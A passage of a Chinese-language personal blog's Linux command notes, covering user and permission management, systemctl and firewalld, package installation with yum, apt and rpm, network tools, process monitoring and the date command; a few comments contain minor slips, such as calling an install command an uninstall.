</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">groupadd 用户组名</span><br></pre></td></tr></table></figure>

<ul>
<li>删除用户组<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">groupdel 用户组名</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p><strong>以下命令需要 root  用户执行</strong></p>
<ul>
<li>创建用户</li>
</ul>
<blockquote>
<p><code>useradd [-g -d] 用户名</code> </p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-g</code>：指定用户的组，若不指定，会创建以用户名命令的组并自动加入， 指定 -g 需要组已经存在</li>
<li><code>-d</code>：指定用户 HOME 路径，不指定，HOME 目录默认在：&#x2F;home&#x2F;root</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建 test 用户，不指定用户组，自动创建 test 用户组</span></span><br><span class="line">useradd <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 创建 test2 用户，加入 test 用户组，并指定HOME路径</span></span><br><span class="line">useradd test2 -g <span class="built_in">test</span> -d /home/yes</span><br></pre></td></tr></table></figure>

<ul>
<li>删除用户</li>
</ul>
<blockquote>
<p><code>userdel [-r] 用户名</code> </p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-r</code>：删除用户的 HOME 目录，不适用 -r ，删除用户时，HOME目录保留</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除 test 用户并保留 HOME 目录</span></span><br><span class="line">userdel <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 删除 test2 用户并删除 HOME 目录</span></span><br><span class="line">userdel -r test2</span><br></pre></td></tr></table></figure>


<ul>
<li>查看用户所属组</li>
</ul>
<blockquote>
<p><code>id [用户名]</code> </p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>用户名</code>：被查看的用户，若不提供，则查看当前登录用户</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 test 用户的所属组</span></span><br><span class="line"><span class="built_in">id</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124540.png" alt=" "></p>
<ul>
<li>修改用户所属组</li>
</ul>
<blockquote>
<p><code>usermod -aG 用户组 用户名</code> </p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 test2 用户加入到 test 用户组</span></span><br><span class="line">usermod -aG <span class="built_in">test</span> test2</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="getent"><a href="#getent" class="headerlink" title="getent"></a>getent</h2><ul>
<li>查看当前系统中用户信息<blockquote>
<p><code>getent passwd</code></p>
<hr>
</blockquote>
</li>
</ul>
<blockquote>
<p>共有 7 份信息，分别是：</p>
<ul>
<li><strong>用户名:密码(显示为x):用户ID:组ID:描述信息:HOME目录:执行终端(默认bash)</strong></li>
</ul>
</blockquote>
<ul>
<li>查看当前系统用户组信息</li>
</ul>
<blockquote>
<p><code>getent group</code></p>
<hr>
<p>共有 3 份信息，分别是：</p>
<ul>
<li><strong>组名称:组认证(显示为x):组ID</strong></li>
</ul>
</blockquote>
<hr>
<h2 id="认知权限信息"><a href="#认知权限信息" class="headerlink" title="认知权限信息"></a>认知权限信息</h2><p>通过 ls -l 可查看文件的权限细节</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124545.png" alt=" "></p>
<blockquote>
<ul>
<li>序号1，表示文件、文件夹的权限控制信息</li>
<li>序号2，表示文件、文件夹所属用户</li>
<li>序号3，表示文件、文件夹所属用户组</li>
</ul>
</blockquote>
<p><strong>解析序号1权限细节</strong>：<br>权限细节共分为 10 个槽位</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124549.png" alt=" "></p>
<blockquote>
<p> 其中：</p>
<ul>
<li>r 代表读权限</li>
<li>w 代表写权限</li>
<li>x 表示执行权限</li>
</ul>
<p> 针对文件、文件夹的不同，rwx的含义有细微差别</p>
<ul>
<li>r。针对文件可以查看文件内容；针对文件夹可以查看文件夹内容，如 ls 命令。</li>
<li>w。针对文件表示可以修改文件；针对文件夹表示可以在文件夹内创建、修改、改名等操作。</li>
<li>x。针对文件表示可以将文件作为程序执行；针对文件夹表示可以更改工作目录带此文件夹，即 cd 进入。</li>
</ul>
</blockquote>
<hr>
<h2 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h2><p><strong>只有文件、文件夹的所属用户或 root 用户可以使用此命令</strong></p>
<blockquote>
<p><strong>chmod</strong>：<br>① 作用：修改文件、文件夹的权限信息<br>② 语法：<code>chmod [-R] 权限 文件或文件夹</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-R</code>：对文件夹内的全部内容应用相同操作</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将文件权限修改为：rwxr-x--x</span></span><br><span class="line"><span class="built_in">chmod</span> u=rwx,g=rx,o=x test.txt</span><br><span class="line">或</span><br><span class="line"><span class="built_in">chmod</span> 751 test.txt</span><br><span class="line"><span class="comment"># 其中</span></span><br><span class="line"><span class="comment"># u 代表user,所属用户权限 </span></span><br><span class="line"><span class="comment"># g 代表group,用户组权限</span></span><br><span class="line"><span class="comment"># o 代表 other,其他用户权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文件夹 test 以及文件夹内全部内容权限设置为：rwxr-x--x</span></span><br><span class="line"><span class="built_in">chmod</span> -R u=rwx,g=rx,o=x <span class="built_in">test</span></span><br><span class="line">或</span><br><span class="line"><span class="built_in">chmod</span> -R 751 <span class="built_in">test</span></span><br></pre></td></tr></table></figure>


<hr>
<h2 id="chown"><a href="#chown" class="headerlink" title="chown"></a>chown</h2><p><strong>只有 root 用户可以执行此命令</strong></p>
<blockquote>
<p><strong>chown</strong>：<br>① 作用：修改文件、文件夹的所属用户和用户组<br>② 语法：<code>chown [-R] [用户] [:] [用户组] 文件或文件夹</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-R</code>：同chmod，对文件夹内的全部内容应用相同操作</li>
<li><code>用户</code>：修改所属用户</li>
<li><code>用户组</code>:修改所属用户组</li>
<li><code>:</code>：用于分割用户和用户组</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 hello.txt 所属用户修改为 test</span></span><br><span class="line"><span class="built_in">chown</span> <span class="built_in">test</span> hello.txt</span><br><span class="line"><span class="comment"># 将 hello.txt 所属用户组修改为 test</span></span><br><span class="line"><span class="built_in">chown</span> :<span class="built_in">test</span> hello.txt </span><br><span class="line"><span class="comment"># 将 hello.txt 所属用户修改为 test，所属用户组修改为 test</span></span><br><span class="line"><span class="built_in">chown</span> <span class="built_in">test</span>:<span class="built_in">test</span> hello.txt</span><br><span class="line"><span class="comment"># 将文件夹 hello 的所属用户修改为 test，并对文件夹内全部内容应用该规则</span></span><br><span class="line"><span class="built_in">chown</span> -R <span class="built_in">test</span> hello</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="systemctl-命令"><a href="#systemctl-命令" class="headerlink" title="systemctl 命令"></a>systemctl 命令</h1><blockquote>
<p><strong>systemctl：</strong><br>① 作用：启动、停止。开机自启 Linux 系统软件或服务<br>② 语法：<code>systemctl start  | stop | status | enable | disable 服务名</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>start</code>：启动</li>
<li><code>stop</code>：停止</li>
<li><code>status</code>：查看状态</li>
<li><code>enable</code>：开启开机自启</li>
<li><code>disable</code>：关闭开机自启</li>
</ul>
<hr>
<p>系统内置服务较多，比如</p>
<ul>
<li><code>NetworkManager</code>，主网络服务</li>
<li><code>nerwork</code>，副网络服务</li>
<li><code>firewald</code>，防火墙服务</li>
<li><code>sshd</code>，ssh服务</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status firewalld              <span class="comment"># 查看防火墙状态</span></span><br><span class="line">systemctl stop firewalld                <span class="comment"># 关闭防火墙</span></span><br><span class="line">systemctl <span class="built_in">enable</span> firewalld              <span class="comment"># 防火墙开机自弃</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld             <span class="comment"># 关闭防火墙开机自启</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="防火墙操作"><a href="#防火墙操作" class="headerlink" title="防火墙操作"></a>防火墙操作</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status firewalld               <span class="comment"># 查看防火墙状态</span></span><br><span class="line">firewall-cmd --state                     <span class="comment"># 查看防火墙状态</span></span><br><span class="line"></span><br><span class="line">systemctl stop firewalld                 <span class="comment"># 暂时关闭防火墙</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld              <span class="comment"># 永久关闭防火墙</span></span><br><span class="line"></span><br><span class="line">systemctl start firewalld                <span class="comment"># 开启防火墙</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --add-port=端口号/tcp --permanent      <span class="comment"># 开放指定端口</span></span><br><span class="line">firewall-cmd --zone=public --remove-port=端口号/tcp --permanent   <span class="comment"># 关闭指定端口</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --reload                    <span class="comment"># 立即生效</span></span><br><span class="line">firewall-cmd --zone=public --list-ports  <span class="comment"># 查看开放的端口</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><h2 id="yum命令"><a href="#yum命令" class="headerlink" title="yum命令"></a>yum命令</h2><p><strong>Centos 使用 yum 管理器</strong><br><strong>yum 命令需要 root 权限，可以 su 切换到 root 或使用 sudo 授权<br>yum 命令需要联网</strong></p>
<blockquote>
<p><strong>yum</strong>：<br>① 作用：自动化安装配置 Linux 软件，并自动解决依赖问题<br>② 语法：<code>yum [-y] [install | remove | search] 软件名称 </code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-y</code>：自动确认，无需手动确认安装或卸载过程</li>
<li><code>install</code>：安装</li>
<li><code>remove</code>：卸载</li>
<li><code>search</code>：搜索</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum search wget        <span class="comment"># 搜索是否有 wget 安装包</span></span><br><span class="line">yum install wget       <span class="comment"># 安装 wget 程序</span></span><br><span class="line">yum -y install wget    <span class="comment"># 卸载 wget 并无需确认</span></span><br></pre></td></tr></table></figure>


<hr>
<h2 id="apt命令"><a href="#apt命令" class="headerlink" title="apt命令"></a>apt命令</h2><p><strong>Ubuntu 使用 apt 管理器</strong><br><strong>apt 命令需要 root 权限，可以 su 切换到 root 或使用 sudo 授权<br>apt 命令需要联网</strong></p>
<blockquote>
<p><strong>apt</strong>：<br>① 作用：自动化安装配置 Linux 软件，并自动解决依赖问题<br>② 语法：<code>apt[-y] [install | remove | search] 软件名称 </code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li>用法与 yum 一致，同样需要 root 权限</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt search wget        <span class="comment"># 搜索是否有 wget 安装包</span></span><br><span class="line">apt install wget       <span class="comment"># 安装 wget 程序</span></span><br><span class="line">apt -y install wget    <span class="comment"># 卸载 wget 并无需确认</span></span><br></pre></td></tr></table></figure>

<h2 id="二进制发布包安装"><a href="#二进制发布包安装" class="headerlink" title="二进制发布包安装"></a>二进制发布包安装</h2><blockquote>
<ul>
<li><strong>二进制发布包安装</strong>： 软件已针对具体平台编译打包发布，只需解压修改配置即可</li>
</ul>
<p><strong>案例：安装jdk</strong></p>
</blockquote>
<p>① 在Windoms中去官网下载<code>jdk-8u191-linux.tar.gz</code></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124601.png" alt=" "></p>
<hr>
<p>② 使用FinalShell自带的上传工具将<code>jdk-8u191-linux.tar.gz</code>上传至Linux</p>
<hr>
<p>③ 解压安装包，在这里，我将其解压在了<code>/usr/local</code>目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf jdk-8u191-linux.tar.gz -C /usr/local</span><br></pre></td></tr></table></figure>

<hr>
<p>④ 配置环境变量，使用vim命令修改<code>/etc/profile</code>文件，在文件末尾添加如下配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JAVA_HOME=/usr/local/jdk1.8.0_191</span><br><span class="line">PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<hr>
<p>⑤ 重新加载profile文件，使更改的配置立即生效</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>

<hr>
<p>⑥ 检查是否安装成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="rpm安装"><a href="#rpm安装" class="headerlink" title="rpm安装"></a>rpm安装</h2><blockquote>
<ul>
<li><strong>rpm安装</strong>： 软件已经按照redhat的包管理规范进行打包，使用rpm命令进行安装，不能自行解决库依赖问题</li>
</ul>
</blockquote>
<p><strong>案例：安装mysql</strong></p>
<p>① 检查当前系统中是否安装mysql数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -qa                      <span class="comment"># 查询当前系统中安装的所有软件</span></span><br><span class="line">rpm -qa | grep mysql         <span class="comment"># 查询当前系统中安装的名称带mysql的软件</span></span><br><span class="line">rpm -qa | grep  mariadb      <span class="comment"># 查询当前系统中安装的名称带mariadb的软件</span></span><br></pre></td></tr></table></figure>
<p><code>注</code>：若当前系统中安装有mysql数据库，安装将失败、Centos7自带有mariadb，与mysql数据库冲突</p>
<hr>
<p>② 卸载已经安装的冲突软件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -e --nodeps 软件名称      <span class="comment"># 卸载软件</span></span><br></pre></td></tr></table></figure>

<hr>
<p>③ 将mysql的安装包上传到Linux并解压</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124606.png" alt=" "></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /usr/local/mysql</span><br><span class="line">tar -zxvf mysql-8.0.30-1.el7.x86_64.rpm-bundle.tar -C /usr/local/mysql</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124608.png" alt=" "></p>
<p>解压后，会得到多个rpm的安装包文件</p>
<hr>
<p>④ 按照顺序安装rpm软件包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -ivh mysql-community-common-8.0.30-1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh mysql-community-libs-8.0.30-1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh mysql-community-devel-8.0.30-1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh mysql-community-libs-compat-8.0.30-1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh mysql-community-libs-compat-8.0.30-1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh mysql-community-libs-compat-8.0.30-1.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>


<hr>
<p>⑤ 启动mysql</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status mysqld        <span class="comment"># 查看mysql服务状态</span></span><br><span class="line">systemctl start mysqld         <span class="comment"># 启动mysql服务</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> mysqld        <span class="comment"># 开机自启mysql服务</span></span><br><span class="line"></span><br><span class="line">netstat -tunlp                 <span class="comment"># 查看已经启动的服务</span></span><br><span class="line">netstat -tunlp | grep mysql </span><br><span class="line"></span><br><span class="line">ps -ef | grep mysql            <span class="comment"># 查看mysql进程 </span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="网络与端口"><a href="#网络与端口" class="headerlink" title="网络与端口"></a>网络与端口</h1><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><blockquote>
<p><strong>ping</strong>：<br>① 作用：检查指定网络服务器是否为可联通状态<br>② 语法：<code>ping [-c num] ip或主机名</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-c</code>：检车的次数，不使用则无限次数持续检查</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检查 baidu.com 是否联通</span></span><br><span class="line">ping baidu.com</span><br><span class="line"><span class="comment"># 检查 8.1.1.1 是否联通，并检查 3 次</span></span><br><span class="line">ping -c 3 8.1.1.1</span><br></pre></td></tr></table></figure>


<hr>
<h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><blockquote>
<p><strong>wget</strong>：<br>① 作用：wget是非交互式的文件下载器，可以在命令行内下载网络文件<br>② 语法：<code>wget [-b] url</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-b</code>：后台下载，会将日志写入到<strong>当前工作目录</strong>的wget-log文件</li>
<li><code>url</code>：下载链接</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载 apache-hadoop 3.3.0</span></span><br><span class="line">wget http://archive.apache.org/dist/hadoop/common/hadoop-3.3.0/hadoop-3.3.0.tar.gz</span><br><span class="line"><span class="comment"># 在后台下载</span></span><br><span class="line">wget -b http://archive.apache.org/dist/hadoop/common/hadoop-3.3.0/hadoop-3.3.0.tar.gz</span><br><span class="line"><span class="comment"># 通过 tail 命令可监控后台下载进度</span></span><br><span class="line"><span class="built_in">tail</span> -f wget-log</span><br></pre></td></tr></table></figure>


<hr>
<h2 id="curl命令"><a href="#curl命令" class="headerlink" title="curl命令"></a>curl命令</h2><blockquote>
<p><strong>curl</strong>：<br>① 作用：可以发送 http 请求，可用于下载文件、获取信息等<br>② 语法：<code>curl [-O] url</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-O</code>：（大写 O）下载文件，当 url 是下载链接时，可使用此选项保存文件</li>
<li><code>url</code>：要发起请求的网络地址</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 向 cip.cc 发起网络请求</span></span><br><span class="line">curl cip.cc</span><br><span class="line"><span class="comment"># 通过 curl 下载 apache-hadoop 3.3.0</span></span><br><span class="line">curl -O http://archive.apache.org/dist/hadoop/common/hadoop-3.3.0/hadoop-3.3.0.tar.gz</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>首先需要安装 nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># centos</span></span><br><span class="line">yum -y install nmap</span><br><span class="line"><span class="comment"># ubuntu</span></span><br><span class="line">apt -y install nmap</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>nmap</strong>：<br>① 作用：查看端口的占用情况<br>② 语法：<code>nmap 被查看的ip地址</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看本机端口占用情况</span></span><br><span class="line">nmap 127.0.0.1</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>首先需要安装 netstat</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># centos</span></span><br><span class="line">yum -y install net-tools</span><br><span class="line"><span class="comment"># ubuntu</span></span><br><span class="line">apt -y install net-tools</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>netstat</strong>：<br>① 作用：查看指定端口的占用情况<br>② 语法：<code>netstat -anp | grep 端口号</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看本机 80 端口占用情况</span></span><br><span class="line">netstat -anp | grep 80</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看本机端口占用情况</span></span><br><span class="line">nmap 127.0.0.1</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h1><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><blockquote>
<p><strong>ps</strong>：<br>① 作用：查看系统中进程信息<br>② 语法：<code>ps [-e -f]</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-e</code>：显示出全部进程</li>
<li><code>-f</code>：以完全格式化的形式展示信息（全部信息）</li>
</ul>
<hr>
<ul>
<li>可使用管道符配合 grep 来进行信息过滤</li>
<li>过滤可过滤名称、进程号、用户ID等</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出全部进程的全部信息</span></span><br><span class="line">ps -ef</span><br><span class="line"><span class="comment"># 找到 tail 命令的进程信息</span></span><br><span class="line">ps -ef | grep <span class="built_in">tail</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124617.png" alt=" "></p>
<blockquote>
<p>从左到右分别是：</p>
<ul>
<li>UID：进程所属的用户ID</li>
<li>PID：进程的进程号ID]</li>
<li>PPID：进程的父ID（启动此进程的其他进程）</li>
<li>C：此进程的CPU占用率（百分比）</li>
<li>STIME：进程的启动时间</li>
<li>TTY：启动此进程的终端序号，如果为 <code>?</code>，则表示非终端启动</li>
<li>TIME：进程占用CPU的时间</li>
<li>CMD：进程对用的名称或启动路径或启动命令</li>
</ul>
</blockquote>
<hr>
<h2 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h2><blockquote>
<p><strong>kill</strong>：<br>① 作用：关闭进程<br>② 语法：<code>kill [-9] 进程ID</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-9</code>：强制关闭进程，不适用此选项会向进程发送信号要求其关闭，是否关闭根据进程自身的处理机制</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 强制杀死 2339 进程</span></span><br><span class="line"><span class="built_in">kill</span> -9 2339</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="主机状态监控"><a href="#主机状态监控" class="headerlink" title="主机状态监控"></a>主机状态监控</h1><h2 id="top"><a href="#top" class="headerlink" title="top"></a>top</h2><blockquote>
<p><strong>top</strong>：<br>① 作用：查看cpu、内存使用情况，类似windoms的任务管理器<br>② 语法：<code>top [-p -d -c -n -b -i -u]</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-p</code>：只显示某个进程的信息</li>
<li><code>-d</code>：设置刷新时间，默认为 5 s</li>
<li><code>-c</code>：显示产生进程的完整命令，默认是进程名</li>
<li><code>-n</code>：指定刷新次数，刷新输出达到次数后退出</li>
<li><code>-b</code>：以非交互非全屏模式运行，以批次的方式执行top，一般配合<code>-n</code>指定输出几次统计信息，将输出重定向到指定文件。比如 <code>top -b -n 3 &gt; /top.tmp</code></li>
<li><code>-i</code>：不显示任何闲置（idle）或无用（zombie）的进程</li>
<li><code>-u</code>： 查找特定用户启动的进程</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只显示 进程ID为 1 的信息</span></span><br><span class="line">top -p 1</span><br><span class="line"><span class="comment"># 刷新输出3次后退出</span></span><br><span class="line">top -n 3</span><br><span class="line"><span class="comment"># 刷新输出3次后退出并输出到 /top.tmp 文件</span></span><br><span class="line">top -b -n 3 &gt; /top.tmp</span><br></pre></td></tr></table></figure>

<p><strong>内容详解</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124620.png" alt="加粗样式"></p>
<ul>
<li>第一行</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124622.png" alt=" "></p>
<ul>
<li>第二行</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124624.png" alt=" "></p>
<ul>
<li>第三行</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124625.png" alt=" "></p>
<ul>
<li>第四、五行</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124627.png" alt=" "></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124629.png" alt=" "></p>
<blockquote>
<ul>
<li>PID：进程id</li>
<li>USER：进程所属用户</li>
<li>PR：进程优先级，越小越高</li>
<li>NI：负值表示高优先级，正表示低优先级</li>
<li>VIRT：进程使用虚拟内存，单位KB</li>
<li>RES：进程使用物理内存，单位KB</li>
<li>SHR：进程使用共享内存，单位KB</li>
<li>S：进程状态（S休眠，R运行，Z僵尸状态，N负数优先级，I空闲状态）</li>
<li>%CPU：进程占用CPU率</li>
<li>%MEM：进程占用内存率</li>
<li>TIME+：进程使用CPU时间总计，单位10毫秒</li>
<li>COMMAND：进程的命令或名称或程序文件路径</li>
</ul>
</blockquote>
<p><strong>top交互式选项</strong></p>
<p>当 top 以交互式运行（非-b选项启动），可以使用以下交互式命令进行控制</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124632.png" alt=" "></p>
<hr>
<h2 id="df"><a href="#df" class="headerlink" title="df"></a>df</h2><blockquote>
<p><strong>df</strong>：<br>① 作用：查看硬盘的使用情况<br>② 语法：<code>df [-h]</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-h</code>：以更加人性化的单位显示</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以人性化的单位显示磁盘使用情况</span></span><br><span class="line"><span class="built_in">df</span> -h</span><br></pre></td></tr></table></figure>


<hr>
<h2 id="iostat"><a href="#iostat" class="headerlink" title="iostat"></a>iostat</h2><blockquote>
<p><strong>iostat</strong>：<br>① 作用：查看cpu、磁盘的相关信息<br>② 语法：<code>iostat [-x] [num1] [num2]</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>--x</code>：显示更多信息</li>
<li><code>num1</code>：数字，刷新间隔，秒数</li>
<li><code>num2</code>：数字，刷新几次</li>
</ul>
</blockquote>
<hr>
<h1 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h1><h2 id="date"><a href="#date" class="headerlink" title="date"></a>date</h2><blockquote>
<p><strong>date</strong>：<br>① 作用：在命令行中查看系统时间<br>② 语法：<code>date [-d] [+格式化字符串]</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-d</code>：按照给定的字符串显示日期，一般用于日期计算<br>其中支持的时间标记有：<ul>
<li>year 年</li>
<li>month 月</li>
<li>day  天</li>
<li>hour 时</li>
<li>minute 分钟</li>
<li>second 秒</li>
</ul>
</li>
<li><code>格式化字符串</code>：通过特定的字符串标记，来控制显示的日期格式<ul>
<li>%Y 年</li>
<li>%y 年份后两位数字（00 - 99）</li>
<li>%M 月份（01 - 12）</li>
<li>%d 日（01 - 31）</li>
<li>%H 小时（00 - 23）</li>
<li>%M 分钟（00 - 59）</li>
<li>%S 秒（00 - 60）</li>
<li>%s 自 1970-01-01 00:00:00 UTC 到现在的秒数</li>
</ul>
</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 按照 2023-01-01 的格式显示日期</span></span><br><span class="line"><span class="built_in">date</span> +%Y-%m-%d</span><br><span class="line"><span class="comment"># 按照 2023-01-01 10:00:00 的格式显示日期,中间有空格，使用双引号包围</span></span><br><span class="line"><span class="built_in">date</span> <span class="string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span></span><br><span class="line"><span class="comment"># 显示后一天日期</span></span><br><span class="line"><span class="built_in">date</span> -d <span class="string">&quot;+1 day&quot;</span> +%Y-%m-%d</span><br><span class="line"><span class="comment"># 显示上个月日期</span></span><br><span class="line"><span class="built_in">date</span> -d <span class="string">&quot;-1 month&quot;</span> +%Y-%m-%d</span><br><span class="line"><span class="comment"># 显示下一年日期</span></span><br><span class="line"><span class="built_in">date</span> -d <span class="string">&quot;+1 year&quot;</span> +%Y-%m-%d</span><br></pre></td></tr></table></figure>


<hr>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>Linux</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
</search>
